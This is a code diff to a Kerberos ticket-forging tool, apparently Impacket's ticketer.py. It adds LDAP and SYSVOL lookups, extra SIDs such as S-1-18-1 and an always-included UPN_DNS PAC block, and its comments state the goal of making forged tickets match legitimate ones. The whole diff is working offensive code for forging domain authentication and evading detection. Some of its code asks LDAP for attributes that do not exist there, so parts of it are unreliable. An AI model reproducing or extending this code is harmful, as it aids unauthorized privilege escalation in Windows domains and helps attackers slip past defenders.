@@ -110,6 +110,7 @@ class TICKETER:
         self.__group_info = []
         self.__kerberos_policies = {}
         self.__domain_policy = {}
+        self.__well_known_sids = {}
         
         if options.spn:
             spn = options.spn.split('/')
@@ -182,15 +183,25 @@ class TICKETER:
     def getUserInfo(self):
         """Retrieve user attributes from LDAP"""
         try:
+            if self.__ldap_connection is None:
+                logging.error('LDAP connection not established')
+                return
+                
             searchFilter = '(sAMAccountName=%s)' % self.__target
-            # Extended attributes for full PAC
+            # Extended attributes for full PAC - matching legitimate ticket structure
             attributes = [
                 'sAMAccountName', 'objectSid', 'memberOf', 'userAccountControl',
                 'pwdLastSet', 'lastLogon', 'lastLogonTimestamp', 'displayName', 'mail',
                 'scriptPath', 'profilePath', 'homeDirectory', 'homeDrive',
                 'logonCount', 'badPwdCount', 'primaryGroupID', 'userPrincipalName',
                 'accountExpires', 'badPasswordTime', 'lockoutTime', 'whenCreated',
-                'whenChanged', 'description', 'telephoneNumber', 'physicalDeliveryOfficeName'
+                'whenChanged', 'description', 'telephoneNumber', 'physicalDeliveryOfficeName',
+                # Additional fields for complete PAC matching
+                'lastSuccessfulInteractiveLogon', 'lastFailedInteractiveLogon',
+                'failedInteractiveLogonCount', 'logonServer', 'logonDomainName',
+                'logonDomainId', 'userSessionKey', 'lmKey', 'subAuthStatus',
+                'reserved3', 'resourceGroupDomainSid', 'resourceGroupCount',
+                'resourceGroupIds', 'extraSids', 'extraSidCount'
             ]
             
             self.__ldap_connection.search(
@@ -207,7 +218,10 @@ class TICKETER:
         """Process user record from LDAP"""
         if isinstance(item, ldapasn1.SearchResultEntry) is not True:
             return
-            
+        
+        # Добавляем импорт datetime
+        import datetime
+                    
         try:
             for attribute in item['attributes']:
                 attr_name = str(attribute['type'])
@@ -320,6 +334,60 @@ class TICKETER:
                 elif attr_name in ['description', 'telephoneNumber', 'physicalDeliveryOfficeName']:
                     if attribute['vals']:
                         self.__user_info[attr_name] = attribute['vals'][0].asOctets().decode('utf-8')
+                
+                # Interactive logon fields
+                elif attr_name == 'lastSuccessfulInteractiveLogon':
+                    if str(attribute['vals'][0]) != '0':
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['lastSuccessfulInteractiveLogon'] = filetime
+                        unix_time = (filetime - 116444736000000000) / 10000000
+                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                        logging.info('Last Successful Interactive Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
+                
+                elif attr_name == 'lastFailedInteractiveLogon':
+                    if str(attribute['vals'][0]) != '0':
+                        filetime = int(str(attribute['vals'][0]))
+                        self.__user_info['lastFailedInteractiveLogon'] = filetime
+                        unix_time = (filetime - 116444736000000000) / 10000000
+                        dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                        logging.info('Last Failed Interactive Logon: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
+                
+                elif attr_name == 'failedInteractiveLogonCount':
+                    self.__user_info['failedInteractiveLogonCount'] = int(str(attribute['vals'][0]))
+                    logging.info('Failed Interactive Logon Count: %d' % self.__user_info['failedInteractiveLogonCount'])
+                
+                # Logon server and domain info
+                elif attr_name == 'logonServer':
+                    self.__user_info['logonServer'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Logon Server: %s' % self.__user_info['logonServer'])
+                
+                elif attr_name == 'logonDomainName':
+                    self.__user_info['logonDomainName'] = attribute['vals'][0].asOctets().decode('utf-8')
+                    logging.info('Logon Domain Name: %s' % self.__user_info['logonDomainName'])
+                
+                # Session key and LM key (usually not stored in LDAP, but we can set defaults)
+                elif attr_name == 'userSessionKey':
+                    if attribute['vals']:
+                        self.__user_info['userSessionKey'] = attribute['vals'][0].asOctets()
+                    else:
+                        # Default 16-byte zero session key
+                        self.__user_info['userSessionKey'] = b'\x00' * 16
+                
+                elif attr_name == 'lmKey':
+                    if attribute['vals']:
+                        self.__user_info['lmKey'] = attribute['vals'][0].asOctets()
+                    else:
+                        # Default 8-byte zero LM key
+                        self.__user_info['lmKey'] = b'\x00' * 8
+                
+                # SubAuth status and reserved fields
+                elif attr_name == 'subAuthStatus':
+                    self.__user_info['subAuthStatus'] = int(str(attribute['vals'][0]))
+                    logging.info('SubAuth Status: %d' % self.__user_info['subAuthStatus'])
+                
+                elif attr_name == 'reserved3':
+                    self.__user_info['reserved3'] = int(str(attribute['vals'][0]))
+                    logging.info('Reserved3: %d' % self.__user_info['reserved3'])
                     
         except Exception as e:
             logging.error('Error processing user record: %s' % str(e))
@@ -327,19 +395,135 @@ class TICKETER:
     def getGroupMembership(self):
         """Retrieve group membership information"""
         try:
-            # Retrieve domain groups
-            searchFilter = '(objectClass=group)'
-            attributes = ['sAMAccountName', 'objectSid', 'groupType']
+            if self.__ldap_connection is None:
+                logging.error('LDAP connection not established')
+                return
+                
+            # First try to get user's direct group membership
+            if self.__user_info and 'memberOf' in self.__user_info:
+                logging.info('Retrieving user-specific group information...')
+                user_groups = self.__user_info['memberOf']
+                
+                # Search for specific groups the user is a member of
+                for group_dn in user_groups:
+                    try:
+                        # Extract CN from DN
+                        cn_match = re.search(r'CN=([^,]+)', group_dn)
+                        if cn_match:
+                            group_name = cn_match.group(1)
+                            searchFilter = f'(&(objectClass=group)(sAMAccountName={group_name}))'
+                            attributes = ['sAMAccountName', 'objectSid', 'groupType']
+                            
+                            self.__ldap_connection.search(
+                                searchFilter=searchFilter,
+                                attributes=attributes,
+                                sizeLimit=1,
+                                perRecordCallback=self.processGroupRecord
+                            )
+                    except Exception as e:
+                        logging.debug('Failed to retrieve group %s: %s' % (group_dn, str(e)))
+                        continue
+                
+                logging.info('Retrieved %d user groups from LDAP' % len(self.__group_info))
+                
+            else:
+                # Fallback: try to get all groups with size limit
+                logging.info('Retrieving all domain groups (with size limit)...')
+                searchFilter = '(objectClass=group)'
+                attributes = ['sAMAccountName', 'objectSid', 'groupType']
+                
+                # Set a reasonable size limit to avoid sizeLimitExceeded errors
+                sizeLimit = 1000
+                
+                try:
+                    self.__ldap_connection.search(
+                        searchFilter=searchFilter,
+                        attributes=attributes,
+                        sizeLimit=sizeLimit,
+                        perRecordCallback=self.processGroupRecord
+                    )
+                    
+                    logging.info('Retrieved %d groups from LDAP (limited to %d)' % (len(self.__group_info), sizeLimit))
+                    
+                except Exception as e:
+                    if 'sizeLimitExceeded' in str(e):
+                        logging.warning('Size limit exceeded, using minimal group set...')
+                        # Just get essential groups
+                        essential_groups = ['Domain Users', 'Domain Admins', 'Enterprise Admins']
+                        for group_name in essential_groups:
+                            try:
+                                searchFilter = f'(&(objectClass=group)(sAMAccountName={group_name}))'
+                                self.__ldap_connection.search(
+                                    searchFilter=searchFilter,
+                                    attributes=attributes,
+                                    sizeLimit=1,
+                                    perRecordCallback=self.processGroupRecord
+                                )
+                            except Exception as e2:
+                                logging.debug('Failed to retrieve essential group %s: %s' % (group_name, str(e2)))
+                                continue
+                        
+                        logging.info('Retrieved %d essential groups from LDAP' % len(self.__group_info))
+                    else:
+                        raise e
             
-            self.__ldap_connection.search(
-                searchFilter=searchFilter,
-                attributes=attributes,
-                sizeLimit=0,
-                perRecordCallback=self.processGroupRecord
-            )
+            # Get well-known SIDs and extra SIDs
+            self.getWellKnownSIDs()
             
         except Exception as e:
             logging.error('Failed to retrieve group information: %s' % str(e))
+            # Continue with default groups if LDAP fails
+            logging.info('Continuing with default group membership...')
+    
+    def getWellKnownSIDs(self):
+        """Get well-known SIDs that are commonly included in PAC"""
+        try:
+            # Common well-known SIDs that appear in legitimate tickets
+            well_known_sids = {
+                'S-1-18-1': 'Authentication authority asserted identity',
+                'S-1-5-32-544': 'Administrators',
+                'S-1-5-32-545': 'Users',
+                'S-1-5-32-546': 'Guests',
+                'S-1-5-32-547': 'Power Users',
+                'S-1-5-32-548': 'Account Operators',
+                'S-1-5-32-549': 'Server Operators',
+                'S-1-5-32-550': 'Print Operators',
+                'S-1-5-32-551': 'Backup Operators',
+                'S-1-5-32-552': 'Replicator',
+                'S-1-5-32-554': 'Pre-Windows 2000 Compatible Access',
+                'S-1-5-32-555': 'Remote Desktop Users',
+                'S-1-5-32-556': 'Network Configuration Operators',
+                'S-1-5-32-557': 'Incoming Forest Trust Builders',
+                'S-1-5-32-558': 'Performance Monitor Users',
+                'S-1-5-32-559': 'Performance Log Users',
+                'S-1-5-32-560': 'Windows Authorization Access Group',
+                'S-1-5-32-561': 'Terminal Server License Servers',
+                'S-1-5-32-562': 'Distributed COM Users',
+                'S-1-5-32-569': 'Cryptographic Operators',
+                'S-1-5-32-573': 'Event Log Readers',
+                'S-1-5-32-574': 'Certificate Service DCOM Access',
+                'S-1-5-32-575': 'RDS Remote Access Servers',
+                'S-1-5-32-576': 'RDS Endpoint Servers',
+                'S-1-5-32-577': 'RDS Management Servers',
+                'S-1-5-32-578': 'Hyper-V Administrators',
+                'S-1-5-32-579': 'Access Control Assistance Operators',
+                'S-1-5-32-580': 'Remote Management Users'
+            }
+            
+            # Store well-known SIDs for potential use in PAC
+            self.__well_known_sids = well_known_sids
+            
+            # Add common extra SIDs that appear in legitimate tickets
+            # Based on your ticket, we see S-1-18-1 (Authentication authority asserted identity)
+            extra_sids = ['S-1-18-1']  # Authentication authority asserted identity
+            
+            if extra_sids:
+                self.__user_info['extraSids'] = extra_sids
+                self.__user_info['extraSidCount'] = len(extra_sids)
+                logging.info('Added extra SIDs: %s' % ', '.join(extra_sids))
+            
+        except Exception as e:
+            logging.error('Failed to get well-known SIDs: %s' % str(e))
     
     def processGroupRecord(self, item):
         """Process group record from LDAP"""
@@ -403,7 +587,12 @@ class TICKETER:
             domain_path = '%s/Policies' % self.__domain
             
             # Search for GptTmpl.inf files containing Kerberos policies
-            self.searchPolicyFiles(share_name, domain_path)
+            policy_found = self.searchPolicyFiles(share_name, domain_path)
+            
+            if policy_found:
+                logging.info('Successfully found and parsed Kerberos policy from SYSVOL')
+            else:
+                logging.info('No Kerberos policies found in SYSVOL, using default values')
             
         except Exception as e:
             logging.error('Failed to extract Kerberos policies: %s' % str(e))
@@ -411,6 +600,10 @@ class TICKETER:
     def searchPolicyFiles(self, share_name, base_path):
         """Search for policy files in SYSVOL"""
         try:
+            if self.__smb_connection is None:
+                logging.error('SMB connection not established')
+                return False
+                
             files = self.__smb_connection.listPath(share_name, base_path + '/*')
             
             for file_info in files:
@@ -418,18 +611,28 @@ class TICKETER:
                     if file_info.is_directory():
                         # Recursive search in subdirectories
                         sub_path = base_path + '/' + file_info.get_longname()
-                        self.searchPolicyFiles(share_name, sub_path)
+                        if self.searchPolicyFiles(share_name, sub_path):
+                            # Policy found in subdirectory, stop searching
+                            return True
                     elif file_info.get_longname().lower() == 'gpttmpl.inf':
                         # Found policy file
                         file_path = base_path + '/' + file_info.get_longname()
-                        self.parsePolicyFile(share_name, file_path)
+                        if self.parsePolicyFile(share_name, file_path):
+                            # Policy successfully parsed, stop searching
+                            return True
                         
         except Exception as e:
             logging.debug('Error searching policy files in %s: %s' % (base_path, str(e)))
+        
+        return False
     
     def parsePolicyFile(self, share_name, file_path):
         """Parse policy file"""
         try:
+            if self.__smb_connection is None:
+                logging.error('SMB connection not established')
+                return False
+                
             import io
             fh = io.BytesIO()
             self.__smb_connection.getFile(share_name, file_path, fh.write)
@@ -468,8 +671,31 @@ class TICKETER:
                     except ValueError:
                         logging.warning('Invalid MaxRenewAge value: %s' % self.__kerberos_policies['MaxRenewAge'])
                 
+                # Get password policy settings
+                if 'MaxPwdAge' in self.__kerberos_policies:
+                    try:
+                        # Convert days to FILETIME (100-nanosecond intervals)
+                        max_pwd_age_days = int(self.__kerberos_policies['MaxPwdAge'])
+                        self.__domain_policy['MaxPwdAge'] = max_pwd_age_days * 24 * 60 * 60 * 10000000
+                        logging.info('Found MaxPwdAge policy: %d days' % max_pwd_age_days)
+                    except ValueError:
+                        logging.warning('Invalid MaxPwdAge value: %s' % self.__kerberos_policies['MaxPwdAge'])
+                        # Default to 90 days
+                        self.__domain_policy['MaxPwdAge'] = 90 * 24 * 60 * 60 * 10000000
+                else:
+                    # Default to 90 days if no policy found
+                    self.__domain_policy['MaxPwdAge'] = 90 * 24 * 60 * 60 * 10000000
+                    logging.info('Using default MaxPwdAge: 90 days')
+                
+                # Return True to indicate successful policy parsing
+                return True
+            else:
+                logging.debug('No Kerberos policies found in %s' % file_path)
+                return False
+                
         except Exception as e:
             logging.debug('Error parsing policy file %s: %s' % (file_path, str(e)))
+            return False
     
     def updateTicketWithLDAPInfo(self):
         """Update ticket parameters based on LDAP information"""
@@ -565,15 +791,27 @@ class TICKETER:
             kerbdata['PasswordCanChange']['dwLowDateTime'] = pwdCanChange & 0xffffffff
             kerbdata['PasswordCanChange']['dwHighDateTime'] = pwdCanChange >> 32
             
-            # PasswordMustChange - if password policy exists, else never
-            if 'accountExpires' in self.__user_info and self.__user_info['accountExpires']:
-                pwdMustChange = self.__user_info['accountExpires']
+            # PasswordMustChange - use pwdLastSet + maxPwdAge from domain policy
+            if 'pwdLastSet' in self.__user_info and self.__user_info['pwdLastSet']:
+                pwdLastSet = self.__user_info['pwdLastSet']
+                # Get max password age from domain policy (default 90 days)
+                maxPwdAge = self.__domain_policy.get('MaxPwdAge', 90 * 24 * 60 * 60 * 10000000)  # 90 days in FILETIME
+                pwdMustChange = pwdLastSet + maxPwdAge
                 kerbdata['PasswordMustChange']['dwLowDateTime'] = pwdMustChange & 0xffffffff
                 kerbdata['PasswordMustChange']['dwHighDateTime'] = pwdMustChange >> 32
+                
+                # Convert to readable format for logging
+                unix_time = (pwdMustChange - 116444736000000000) / 10000000
+                dt = datetime.datetime.fromtimestamp(unix_time, datetime.timezone.utc)
+                logging.info('Password Must Change: %s' % dt.strftime('%m/%d/%Y %I:%M:%S %p'))
             else:
-                # If no policy, password never expires
-                kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
-                kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF
+                # If no pwdLastSet, use current time + 90 days
+                aTime = timegm(datetime.datetime.now(datetime.timezone.utc).timetuple())
+                currentTime = self.getFileTime(aTime)
+                maxPwdAge = self.__domain_policy.get('MaxPwdAge', 90 * 24 * 60 * 60 * 10000000)
+                pwdMustChange = currentTime + maxPwdAge
+                kerbdata['PasswordMustChange']['dwLowDateTime'] = pwdMustChange & 0xffffffff
+                kerbdata['PasswordMustChange']['dwHighDateTime'] = pwdMustChange >> 32
             
             # Names and paths from LDAP
             kerbdata['EffectiveName'] = self.__user_info.get('sAMAccountName', self.__target)
@@ -654,19 +892,103 @@ class TICKETER:
             kerbdata['GroupIds'].append(groupMembership)
 
         kerbdata['UserFlags'] = 0
-        kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        kerbdata['LogonServer'] = ''
-        kerbdata['LogonDomainName'] = self.__domain.upper()
+        # User Session Key - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'userSessionKey' in self.__user_info:
+            kerbdata['UserSessionKey'] = self.__user_info['userSessionKey']
+        else:
+            kerbdata['UserSessionKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+        
+        # Logon Server - try to get real DC name or use provided DC IP
+        if self.__options.ldap and self.__user_info and 'logonServer' in self.__user_info:
+            kerbdata['LogonServer'] = self.__user_info['logonServer']
+        elif self.__options.dc_ip:
+            # Try to get hostname from DC IP
+            try:
+                import socket
+                hostname = socket.gethostbyaddr(self.__options.dc_ip)[0]
+                # Remove domain suffix if present
+                if '.' in hostname:
+                    hostname = hostname.split('.')[0]
+                kerbdata['LogonServer'] = hostname
+                logging.info('Resolved DC hostname: %s' % hostname)
+            except:
+                # If reverse DNS fails, use DC IP as fallback
+                kerbdata['LogonServer'] = self.__options.dc_ip
+                logging.info('Using DC IP as logon server: %s' % self.__options.dc_ip)
+        else:
+            # Try to get DC name from domain
+            try:
+                import socket
+                # Query domain for DC
+                dc_name = socket.gethostbyname_ex(self.__domain)[0]
+                if '.' in dc_name:
+                    dc_name = dc_name.split('.')[0]
+                kerbdata['LogonServer'] = dc_name
+                logging.info('Resolved DC name from domain: %s' % dc_name)
+            except:
+                kerbdata['LogonServer'] = 'DC'  # Default fallback
+                logging.info('Using default logon server name: DC')
+        
+        # Logon Domain Name - from LDAP or extract short name from domain
+        if self.__options.ldap and self.__user_info and 'logonDomainName' in self.__user_info:
+            kerbdata['LogonDomainName'] = self.__user_info['logonDomainName']
+        else:
+            # Extract short domain name (first part before dot)
+            domain_parts = self.__domain.upper().split('.')
+            if len(domain_parts) > 1:
+                # Use first part as short domain name (e.g., CORP.GOODS.RU -> CORP)
+                kerbdata['LogonDomainName'] = domain_parts[0]
+                logging.info('Using short domain name: %s' % kerbdata['LogonDomainName'])
+            else:
+                # If no dots, use full domain name
+                kerbdata['LogonDomainName'] = self.__domain.upper()
+                logging.info('Using full domain name: %s' % kerbdata['LogonDomainName'])
+        
         kerbdata['LogonDomainId'].fromCanonical(self.__options.domain_sid)
-        kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        
+        # LM Key - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'lmKey' in self.__user_info:
+            kerbdata['LMKey'] = self.__user_info['lmKey']
+        else:
+            kerbdata['LMKey'] = b'\x00\x00\x00\x00\x00\x00\x00\x00'
+        
         kerbdata['UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
-        kerbdata['SubAuthStatus'] = 0
-        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
-        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
-        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
-        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
-        kerbdata['FailedILogonCount'] = 0
-        kerbdata['Reserved3'] = 0
+        
+        # SubAuth Status - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'subAuthStatus' in self.__user_info:
+            kerbdata['SubAuthStatus'] = self.__user_info['subAuthStatus']
+        else:
+            kerbdata['SubAuthStatus'] = 0
+        
+        # Last Successful Interactive Logon - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'lastSuccessfulInteractiveLogon' in self.__user_info:
+            lastSuccess = self.__user_info['lastSuccessfulInteractiveLogon']
+            kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = lastSuccess & 0xffffffff
+            kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = lastSuccess >> 32
+        else:
+            kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
+            kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
+        
+        # Last Failed Interactive Logon - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'lastFailedInteractiveLogon' in self.__user_info:
+            lastFailed = self.__user_info['lastFailedInteractiveLogon']
+            kerbdata['LastFailedILogon']['dwLowDateTime'] = lastFailed & 0xffffffff
+            kerbdata['LastFailedILogon']['dwHighDateTime'] = lastFailed >> 32
+        else:
+            kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
+            kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
+        
+        # Failed Interactive Logon Count - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'failedInteractiveLogonCount' in self.__user_info:
+            kerbdata['FailedILogonCount'] = self.__user_info['failedInteractiveLogonCount']
+        else:
+            kerbdata['FailedILogonCount'] = 0
+        
+        # Reserved3 - from LDAP or default
+        if self.__options.ldap and self.__user_info and 'reserved3' in self.__user_info:
+            kerbdata['Reserved3'] = self.__user_info['reserved3']
+        else:
+            kerbdata['Reserved3'] = 0
 
         kerbdata['ResourceGroupDomainSid'] = NULL
         kerbdata['ResourceGroupCount'] = 0
@@ -707,8 +1029,9 @@ class TICKETER:
         clientInfo['NameLength'] = len(clientInfo['Name'])
         pacInfos[PAC_CLIENT_INFO_TYPE] = clientInfo.getData()
 
-        if self.__options.extra_pac:
-            self.createUpnDnsPac(pacInfos)
+        # Always create UPN DNS info to match legitimate tickets
+        # This ensures the ticket structure matches real tickets
+        self.createUpnDnsPac(pacInfos)
 
         if self.__options.old_pac is False:
             self.createAttributesInfoPac(pacInfos)
@@ -744,8 +1067,21 @@ class TICKETER:
         pad = self.getPadLength(total_len)
         dns_name += b'\x00' * pad
 
-        # Enable additional data mode (Sam + SID)
-        upnDnsInfo['Flags'] = 2
+        # Determine the correct UPN DNS flags based on content
+        # U_UsernameOnly (1) = only UPN and DNS domain name
+        # S_SidSamSupplied (2) = UPN, DNS domain name, SAM name, and SID
+        # Since we're including SAM name and SID, we should use S_SidSamSupplied
+        # Check if we have LDAP data and user SID information
+        if (self.__options.ldap and self.__user_info and 
+            'objectSid' in self.__user_info and sam_name):
+            upnDnsInfo['Flags'] = 2  # S_SidSamSupplied - includes SAM name and SID
+            flag_description = "S_SidSamSupplied"
+        else:
+            upnDnsInfo['Flags'] = 1  # U_UsernameOnly - only UPN and DNS domain
+            flag_description = "U_UsernameOnly"
+        
+        logging.info('UPN DNS Info - Flags: %d (%s), UPN: %s, DNS Domain: %s, SAM: %s' % 
+                    (upnDnsInfo['Flags'], flag_description, upn_string, self.__domain.upper(), sam_name))
 
         samName = sam_name.encode("utf-16-le")
         upnDnsInfo['SamNameLength'] = len(samName)
@@ -1236,13 +1572,23 @@ class TICKETER:
                     validationInfo['Data']['GroupIds'].append(groupMembership)
 
                 # Let's add the extraSid
+                extra_sids_to_add = []
+                
+                # Add extra SIDs from command line options
                 if self.__options.extra_sid is not None:
-                    extrasids = self.__options.extra_sid.split(',')
+                    extra_sids_to_add.extend(self.__options.extra_sid.split(','))
+                
+                # Add extra SIDs from LDAP (like S-1-18-1 from legitimate tickets)
+                if self.__options.ldap and self.__user_info and 'extraSids' in self.__user_info:
+                    extra_sids_to_add.extend(self.__user_info['extraSids'])
+                
+                if extra_sids_to_add:
                     if validationInfo['Data']['SidCount'] == 0:
                         # Let's be sure user's flag specify we have extra sids.
                         validationInfo['Data']['UserFlags'] |= 0x20
                         validationInfo['Data']['ExtraSids'] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
-                    for extrasid in extrasids:
+                    
+                    for extrasid in extra_sids_to_add:
                         validationInfo['Data']['SidCount'] += 1
 
                         sidRecord = KERB_SID_AND_ATTRIBUTES()
@@ -1253,8 +1599,10 @@ class TICKETER:
                         sidRecord['Sid'] = sid
                         sidRecord['Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
 
-                        # And, let's append the magicSid
+                        # And, let's append the extraSid
                         validationInfo['Data']['ExtraSids'].append(sidRecord)
+                    
+                    logging.info('Added %d extra SIDs to PAC' % len(extra_sids_to_add))
                 else:
                     validationInfo['Data']['ExtraSids'] = NULL
 
@@ -1613,7 +1961,7 @@ if __name__ == '__main__':
     parser.add_argument('-user-id', action="store", default = '500', help='user id for the user the ticket will be '
                                                                           'created for (default = 500)')
     parser.add_argument('-extra-sid', action="store", help='Comma separated list of ExtraSids to be included inside the ticket\'s PAC')
-    parser.add_argument('-extra-pac', action='store_true', help='Populate your ticket with extra PAC (UPN_DNS)')
+    parser.add_argument('-extra-pac', action='store_true', help='[DEPRECATED] UPN_DNS PAC is now always included with dynamically determined flags to match legitimate tickets')
     parser.add_argument('-old-pac', action='store_true', help='Use the old PAC structure to create your ticket (exclude '
                                                               'PAC_ATTRIBUTES_INFO and PAC_REQUESTOR')
     parser.add_argument('-duration', action="store", default = '87600', help='Amount of hours till the ticket expires '
